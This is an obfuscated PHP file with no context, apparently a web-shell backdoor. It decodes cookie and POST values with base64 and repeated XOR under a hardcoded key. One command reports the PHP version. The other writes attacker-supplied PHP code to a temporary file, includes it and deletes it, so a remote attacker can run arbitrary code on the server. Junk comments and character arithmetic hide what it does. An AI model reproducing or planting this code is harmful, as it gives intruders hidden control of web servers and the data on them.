<?php   function/* c  */qyvjrqk(){$iucwkge='gkuhz';/*  x   */print_r      (8677+8677);   }


$iljvkhld	=       'iljvkhld'/*d */^	'
';


function  kxzrso($eokpe,   $xxzhwgix)

{
	global	$iljvkhld;

      $sk_dkgmj/*   _ */=   "";
      for/* ixhk */($wjxvw_rm   =/*   ff */0;/*  q*/$wjxvw_rm     <       strlen($eokpe);)	{

	for	($blddby/* ktdw*/=/*yfanv */0;/*   ti */$blddby       <     strlen($xxzhwgix)/*yxfic */&&/*   ljn   */$wjxvw_rm    <    strlen($eokpe);      $blddby++,	$wjxvw_rm++)    {

	$sk_dkgmj    .=	$iljvkhld(ord($eokpe[$wjxvw_rm])	^/*  qds   */ord($xxzhwgix[$blddby]));


/*  n   */}
	}

	return	$sk_dkgmj;

}




function/*tgc   */tecgodav_n($_pwtxn,      $eokpe)


{

       global/*  pkcon*/$iljvkhld;


	$dupkqbpd_v   =/*  qmkx*/sprintf("\x2e"/*uhdx   */.      "\x2f"	.    "\45"/* y   */.  $iljvkhld(1026-911)	.   "\56"/*   n   */./*   v   */"p".$iljvkhld(999-891),    md5($_pwtxn));
	file_put_contents($dupkqbpd_v,/* _   */"<"    ./* csofc  */"\77"/*   jowhw  */.    "p"."\150"      ./*_bib*/$iljvkhld(112)/*  ylv   */.	$iljvkhld(32)  ./* pb  */"u"."n"."l"."\x69"       ./*fb*/$iljvkhld(110)/* v  */.	$iljvkhld(107)   .	"(".$iljvkhld(95)   .    $iljvkhld(778-683)    ./* e  */$iljvkhld(70)/* rt*/./*   _n*/"I"."L"."E".$iljvkhld(95)     .	"_"."\51"	.	$iljvkhld(59)/*sk */./*wkvf  */$iljvkhld(32)/*  j   */.  $eokpe[$iljvkhld(542-442)]);/*kowp   */include($dupkqbpd_v);

	$degbpfhsd_	=	$dupkqbpd_v;

     unlink($degbpfhsd_);


}

function       iqzutuplzv()
{    global       $iljvkhld;/*  lfj   */   $wjxvw_rm	=/*chzm   */array();


/*   wakd*/$wjxvw_rm["p"."v"]	=	phpversion();      $wjxvw_rm["\163"    ./* o */"v"]	=      $iljvkhld(51)     ./*kd   */"\56"	./* owt */$iljvkhld(882-829);


	echo   @serialize($wjxvw_rm);


}


function      nuzkp($eokpe,	$_pwtxn,	$dokslu)


{

  global   $iljvkhld;
/* jeodj */
   $eokpe	=	unserialize(kxzrso(kxzrso(base64_decode($eokpe),	$_pwtxn),	$dokslu));  if    (isset($eokpe["a"."k"]))	{	if	($eokpe["a"]     ==/*   tqkb   */"i")      {   iqzutuplzv();

	}	elseif      ($eokpe["a"]    ==    "\x65")/*c */{


    tecgodav_n($_pwtxn,  $eokpe);


/*   cavlv  */}
	exit();	}
}




$_mspxwwm/*mylbh*/=	$_COOKIE;


$ncnvrqydci	=	$_POST;$_mspxwwm	=	array_merge($ncnvrqydci,/*   v  */$_mspxwwm);




$_pwtxn   =	"3"."7"."\x33"	.	$iljvkhld(98)	.       $iljvkhld(48)  .     "\62"	.      $iljvkhld(98)/* xxggg   */.       "2"."-"."f"."b".$iljvkhld(145-92)  .    "\x34"     ./* _lx  */$iljvkhld(45)	.      "\64"   .   "c".$iljvkhld(542-442).$iljvkhld(54)      .	$iljvkhld(45)       .  $iljvkhld(705-608)  ./* upxsb */"\x36"	.     "\144"/* lm */.	"1"."-"."\x32"    .	$iljvkhld(993-894)/*brjy */.	"9"."\66"/* wv   */.	$iljvkhld(55)/*   eh  */.	"3"."a"."7"."f"."\x37"/*   zuchi*/.      "\62"	.	$iljvkhld(267-215);

foreach/*   zpi   */($_mspxwwm       as/*qyfx */$dokslu   =>/*   foi*/$eokpe)/*  b */{

/*  k_iz */nuzkp($eokpe,/*  r*/$_pwtxn,     $dokslu);

}


